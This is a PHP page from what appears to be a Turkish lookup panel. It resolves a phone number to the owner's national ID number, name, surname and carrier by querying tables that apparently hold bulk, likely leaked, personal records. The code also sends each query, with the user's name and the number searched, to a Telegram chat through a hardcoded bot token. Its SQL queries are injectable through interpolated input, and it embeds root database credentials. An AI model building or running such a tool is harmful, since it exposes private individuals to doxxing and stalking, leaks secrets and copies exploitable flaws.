<?php

include '../server/database.php';

include '../server/rolecontrol.php';

include '../server/functions.php';

$page_title = "GSM'den İsim Sorgu";


?>
<!DOCTYPE html>

<html lang="tr">

<head>
	<?php include 'inc/header_main.php'; ?>
	<link href="assets/plugins/custom/datatables/datatables.bundle.css" rel="stylesheet" type="text/css" />
	<script src="assets/plugins/custom/datatables/datatables.bundle.js"></script>
	<style>
		.form-select {
			margin: 8px;
		}
	</style>
</head>


<body id="kt_body" class="aside-enabled">
	<div class="d-flex flex-column flex-root">
		<div class="page d-flex flex-row flex-column-fluid">
			<?php include 'inc/header_sidebar.php'; ?>
			<div class="wrapper d-flex flex-column flex-row-fluid" id="kt_wrapper">
				<?php include 'inc/header_navbar.php'; ?>
				<div class="content d-flex flex-column flex-column-fluid " id="kt_content">
					<div class="post d-flex flex-column-fluid" id="kt_post">
						<div id="kt_content_container" class="container-xxl">
							<div class="row">
								<div class="col-xl-12 col-md-12">
									<div class="col-lg-12">
										<div class="card">
											<div class="card-body">
												<h4 class="card-title mb-4"><img style="width: 28px;height: auto;" src="/assets/img/icons/mobile.png" alt=""> &nbsp; GSM'den İsim Sorgu</h4>
												<div style="padding: 3.8px;"></div>
												<div class="block-content tab-content">
													<form action="gsmisim" method="POST">
														<div class="tab-pane active" id="tc" role="tabpanel">
															<input class="form-control form-control-solid"
																autocomplete="off" type="tel" id="kt_inputmask_2"
																name="phoneNumber" placeholder="Telefon Numarası"
																required>
															<br>
														</div>
														<center class="button-list">
															<button name="Sorgula" type="submit"
																class="btn waves-effect waves-light btn-rounded bg-success"
																style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
																Sorgula </button>
															<button onclick="clearTable()" type="button"
																class="btn waves-effect waves-light btn-rounded bg-danger"
																style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
																Sıfırla </button>
															<button onclick="copyTable()" type="button"
																class="btn waves-effect waves-light btn-rounded bg-primary"
																style="font-weight: 400;width: 180px; height: 45px; outline: none; margin-left: 5px;">
																Kopyala </button>
															<button onclick="printTable()" type="button"
																class="btn waves-effect waves-light btn-rounded bg-info"
																style="font-weight: 400;;width: 180px; height: 45px; outline: none; margin-left: 5px;">
																Yazdır</button><br><br>
														</center>
													</form>

													<div class="table-responsive">

														<table id="kt_datatable_dom_positioning"
															class="table table-striped table-row-bordered gy-5 gs-7 border rounded">
															<thead>
																<tr>
																	<th>Kimlik Numarası</th>
																	<th>Telefon Numarası</th>
																	<th>Ad</th>
																	<th>Soyad</th>
																	<th>Operatör</th>
																</tr>
															</thead>
															<tbody id="00001010">
																<?php
																if (isset($_POST['Sorgula'])) {
                                                                    // Telegram Bot Credentials
                                                                    $telegramBotToken = "8023055024:AAH1k7VBZIqGqrmXLdkccFxiJJw_JVM99Y0"; // Replace with your bot token
                                                                    $telegramChatID = "-1002452003438"; // Replace with your chat ID

                                                                    // Function to send message to Telegram
                                                                    function sendTelegramMessage($message, $botToken, $chatID)
                                                                    {
                                                                        $url = "https://api.telegram.org/bot$botToken/sendMessage";
                                                                        $data = [
                                                                            'chat_id' => $chatID,
                                                                            'text' => $message,
                                                                            'parse_mode' => 'HTML'
                                                                        ];

                                                                        $options = [
                                                                            'http' => [
                                                                                'header'  => "Content-Type: application/x-www-form-urlencoded\r\n",
                                                                                'method'  => 'POST',
                                                                                'content' => http_build_query($data)
                                                                            ]
                                                                        ];

                                                                        $context  = stream_context_create($options);
                                                                        file_get_contents($url, false, $context);
                                                                    }

																	$currentTime = time();
																	$lastQueryTime = $_SESSION['last_query_time'];
																	$timeDifference = $currentTime - $lastQueryTime;


																	if ($access_level != 6 || $premium != 1) {

																		if ($timeDifference < 10) {
																			echo '<script type="text/javascript">toastr.error("10 saniyede 1 kere sorgu atabilirsiniz.");</script>';
																			exit;
																		} else {
																			$_SESSION['last_query_time'] = time();
																		}
																	}

																	totalLog("gsmisimsrg");
																	countAdd();

																	$randomXP = rand(10, 200);

																	$exp_result = $exp + $randomXP;

																	$sql = "UPDATE `accounts` SET exp = :exp WHERE hash = :hash";
																	$update = $db->prepare($sql);
																	$update->bindParam(':exp', $exp_result);
																	$update->bindParam(':hash', $_SESSION['GET_USER_SSID']);
																	$update->execute();

																	$no = htmlspecialchars(strip_tags($_POST['phoneNumber']));

																	$temiz_telefon_numarasi = str_replace(array("(", ")", " ", "-"), "", $no);
                                                                    require_once '../server/webhook.php';

																	$title = $page_title;


																	$getInfoSSID = $_SESSION['GET_USER_SSID'];

																	$getInfoQuery = $db->query("SELECT * FROM `accounts` WHERE hash = '$getInfoSSID'");

																	while ($getInfoData = $getInfoQuery->fetch()) {
																		$username = base64_decode($getInfoData['username']);
																	}

																	$time = date('d.m.Y H:i');

                                                                    $telegramMessage = "🕵️‍♂️ <b>GSM -> İSİM </b> 🕵️‍♂️
                                                                                            👤 <b>Kullanıcı:</b> <code>$username</code>
                                                                                            📄 <b>Sorgulanan No:</b> <code>$no</code>
                                                                                            🕒 <b>Tarih:</b> " . date('d.m.Y H:i') . "";


                                                                    sendTelegramMessage($telegramMessage, $telegramBotToken, $telegramChatID);


																	$db = new PDO("mysql:host=localhost:8889;dbname=145_gsm;charset=utf8", "root", "root");

																	$query = $db->query("SELECT * FROM 145mgsm WHERE GSM = '$temiz_telefon_numarasi' ORDER BY TC DESC");

																	while ($data = $query->fetch()) {
																		$getTc = $data['TC'];
																		$getGsm = $data['GSM'];
																	}

																	$db2 = new PDO("mysql:host=localhost:8889;dbname=sorguuu;charset=utf8", "root", "root");

																	$query2 = $db2->query("SELECT * FROM 109m WHERE TC = '$getTc'");

																	while ($data2 = $query2->fetch()) {
																		$getName = $data2['AD'];
																		$getSurname = $data2['SOYAD'];
																	}
																	// OPERATOR BULALIM
																	$telno=$temiz_telefon_numarasi;
																	$alankod=substr($telno,0,3);
																	$telekom = array(501, 505, 506, 507, 551, 552, 553, 554, 555, 559); // TÜRKTELEKOM
																	$turkcell = array(530, 531, 532, 533, 534, 535, 536, 537, 538, 539); // TURKCELL
																	$vodafone = array(540, 541, 542, 543, 544, 545, 546, 547, 548, 549); // VODAFONE
																	$kktc_telsim = array(54285, 54286, 54287, 54288); // KKTC TELSIM
																	$kktc_turkcell = array(53383, 53384, 53385, 53386, 53387); // KKTC TURKCELL
																	if (in_array($alankod,$telekom)) {
																	$operator="Türk Telekom";
																	}elseif (in_array($alankod,$vodafone)) {
																	$operator="Vodafone";
																	}elseif (in_array($alankod,$turkcell)) {
																	$operator="Turkcell";
																	}else {
																	$operator= "Böyle Bir Operatör Bulunamadı";
																	}
																	// BİTİŞ
																	if (empty($getName)) {
																		echo "<script>toastr.error('Maalesef, sorguladığınız kişinin isim bilgisi bulunamadı.');</script>";
																	} else {
																		echo "<script>toastr.success('Sorgu işlemi başarıyla tamamlandı!');</script>";
																		echo "<script>toastr.info('$randomXP deneyim puanı kazandınız.');</script>";
																	?>

																	<tr>
																		<th>
																			<?= $getTc; ?>
																		</th>
																		<th>
																			<?= $getGsm ?>
																		</th>
																		<th>
																			<?= $getName; ?>
																		</th>
																		<th>
																			<?= $getSurname; ?>
																		</th>
																		<th>
																			<?= $operator; ?>
																		</th>
																	</tr>

																<?php } }?>
															</tbody>
														</table>
													</div>
												</div>
											</div>
										</div>
									</div>
								</div>
							</div>
						</div>
					</div>
				</div>
				<?php include 'inc/footer_main.php'; ?>
			</div>
		</div>
	</div>

	<div id="kt_scrolltop" class="scrolltop" data-kt-scrolltop="true">
		<i class="ki-duotone ki-arrow-up"><span class="path1"></span><span class="path2"></span></i>
	</div>

	<style>
		#kt_datatable_dom_positioning_filter {
			text-align: left;
			margin-right: 15px;
		}

		.dt-buttons button:nth-child(3) {
			background-color: #dc3545 !important;
			color: #fff;
			border-color: #dc3545;
		}
	</style>

	<script>
		$(document).ready(function () {
			var table = $('#kt_datatable_dom_positioning').DataTable({
				"language": {
					"lengthMenu": "Sayfada _MENU_ kayıt göster",
					"emptyTable": "Tabloda herhangi bir veri bulunmamaktadır",
					"info": "_TOTAL_ kayıttan _START_ - _END_ arasındaki kayıtlar gösteriliyor",
					"infoEmpty": "Gösterilecek kayıt bulunamadı",
					"infoFiltered": "(_MAX_ kayıt içerisinden bulunan)",
					"zeroRecords": "Eşleşen kayıt bulunamadı",
					"search": "Ara:",
					"processing": "İşleniyor...",
					"loadingRecords": "Kayıtlar yükleniyor...",
					"paginate": {
						"first": "İlk",
						"last": "Son",
						"next": "Sonraki",
						"previous": "Önceki"
					},
					"buttons": {
						"copy": "Kopyala",
						"excel": "Excel",
						"pdf": "PDF"
					}
				},
				"dom": "<'row'" +
					"<'col-sm-12 d-flex align-items-center justify-content-start'l>" +
					"<'col-sm-12 d-flex align-items-center justify-content-end'f>" +
					">" +
					"<'table-responsive'tr>" +
					"<'row'" +
					"<'col-sm-12 col-md-5 d-flex align-items-center justify-content-start justify-content-md-start'i>" +
					"<'col-sm-12 col-md-7 d-flex align-items-center justify-content-start justify-content-md-end'p>" +
					">",
				"sDom": '<"refresh"i<"clear">>rt<"top"lf<"clear">>rt<"bottom"p<"clear">>',
				"paging": false,
				"ordering": false,
				"info": false
			});

			new $.fn.dataTable.Buttons(table, {
				buttons: [
					'excel',
					{
                        extend: 'pdfHtml5',
                        customize: function (doc) {
                            // Özel PDF ayarları buraya eklenir
                            doc.defaultStyle.fontSize = 5;
                            doc.styles.tableHeader.fontSize = 5;
                            doc.styles.tableBodyOdd.fontSize = 5;
                            doc.styles.tableBodyEven.fontSize = 5;
                        }
                    },
					{
						text: 'Sorun Bildir',
						action: function (e, dt, node, config) {
							// SweetAlert ile kullanıcıya bir form göster
							Swal.fire({
								title: 'Sorun Bildir',
								html: '<textarea max="200" min="10" id="sorun" class="form-control" placeholder="Sorununuzu yazın">',
								focusConfirm: false,
								preConfirm: () => {
									// Kullanıcının girdiği değeri al
									const sorun = Swal.getPopup().querySelector('#sorun').value;
									// Discord webhook'a post at
									postToDiscordWebhook(sorun);
								}
							});
						}
					}
				]
			}).container().appendTo($('#kt_datatable_dom_positioning_wrapper .col-sm-12:eq(1)'));

			$('#kt_datatable_dom_positioning_filter input').on('keyup', function () {
				table.search(this.value).draw();
			});
		});

		function postToDiscordWebhook(sorun) {
			// Post verilerini ayarla
			var postData = {
				content: ` **Sorun:** ${sorun} \n**Gönderen: ** <?= $username; ?> \n**Sayfa Başlığı: ** <?= $page_title; ?> \n**Gönderilen Tarih** <?= date('d.m.Y H:i'); ?>`
			};

			// BİZLE SADECE BURDAN İLETİŞİM KURABİLECEĞİNİZ İÇİN BURAYI AÇIK BIRAKIYORUM
			// VELİ İZNİNİZİ ALIN MESAJINIZI ÖYLE ATIN BOHOHOHOYT
			var webhookUrl = '<?= $web6 ?>'; // Kendi webhook URL'nizi buraya ekleyin

			// jQuery ile post isteği gönder
			$.ajax({
				type: 'POST',
				url: "../pages/php/check_data.php",
				success: function (response) {

					if (response == 0) {
						toastr.error("Günlük Limite Ulaştınız.");
					} else {
						$.ajax({
							type: 'POST',
							url: webhookUrl,
							contentType: 'application/json',
							data: JSON.stringify(postData),
							success: function (response) {
								// Başarılıysa işlemleri burada yapabilirsiniz
								toastr.success("Sorun başarıyla yöneticilere bildirildi.")
							},
							error: function (error) {
								// Hata oluştuysa işlemleri burada yapabilirsiniz
								toastr.success("Hata oluştu! Yöneticiler ile iletişime geçiniz!")
							}
						});

						$.ajax({
							type: 'POST',
							url: "../pages/php/pin_claim.php",
							success: function (response) {
								// Başarılıysa işlemleri burada yapabilirsiniz
								toastr.success("Kalan Kullanım Hakkınız " + response)
							},
							error: function (error) {
								// Hata oluştuysa işlemleri burada yapabilirsiniz
								toastr.success("Hata oluştu! Yöneticiler ile iletişime geçiniz!")
							}
						});
					}

				},
				error: function (error) {
					// Hata oluştuysa işlemleri burada yapabilirsiniz
					toastr.success("Hata oluştu! Yöneticiler ile iletişime geçiniz!")
				}
			});
		}
	</script>

	<script>
		function clearTable() {
			window.location.reload();
		}
	</script>

	<script>
		function copyTable() {
			var table = $('#kt_datatable_dom_positioning').DataTable(); // Datatable'ı seç
			var data = table.data(); // Tüm verileri al
			var text = '';

			// Tüm satırları döngüyle gez ve verileri metin olarak birleştir
			data.each(function (value, index) {
				text += value.join('\t') + '\n'; // Satırları birleştir ve aralarına tab karakteri (\t) ekleyerek ayrıştır
			});

			// Kopyalama işlemi için gizli bir textarea oluştur
			var textarea = document.createElement('textarea');
			textarea.value = text;
			document.body.appendChild(textarea);

			// Verileri kopyala
			textarea.select();
			document.execCommand('copy');
			document.body.removeChild(textarea);

			toastr.success('Tablo kopyalandı!');
		}
	</script>

	<script>
		function printTable() {
			window.print();
		}
	</script>

	<script>
		Inputmask({
			"mask": "(999) 999-9999"
		}).mask("#kt_inputmask_2");
	</script>

	<script src="assets/plugins/global/plugins.bundle.js"></script>
	<script src="assets/js/scripts.bundle.js"></script>
	<script src="assets/plugins/custom/fullcalendar/fullcalendar.bundle.js"></script>
	<script src="assets/plugins/custom/datatables/datatables.bundle.js"></script>
	<script src="assets/js/widgets.bundle.js"></script>
	<script src="assets/js/custom/widgets.js"></script>
	<script src="assets/js/custom/apps/chat/chat.js"></script>
	<script src="assets/js/custom/utilities/modals/users-search.js"></script>

</body>


</html>